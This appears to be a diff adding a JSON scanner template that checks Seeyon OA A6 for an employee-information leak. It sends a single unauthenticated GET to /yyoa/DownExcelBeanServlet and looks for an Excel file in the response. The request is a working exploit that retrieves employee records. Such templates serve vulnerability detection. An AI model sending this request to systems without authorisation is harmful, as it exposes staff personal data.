@@ -1,0 +1,36 @@
+{
+    "Name": "致远OA-a6-employee-info-leak",
+    "Description": "致远OA-a6-employee-info-leak",
+    "Product": "致远OA",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "[Content_Types].xml"
+                }, {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "Excel.Sheet.xml"
+                    },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
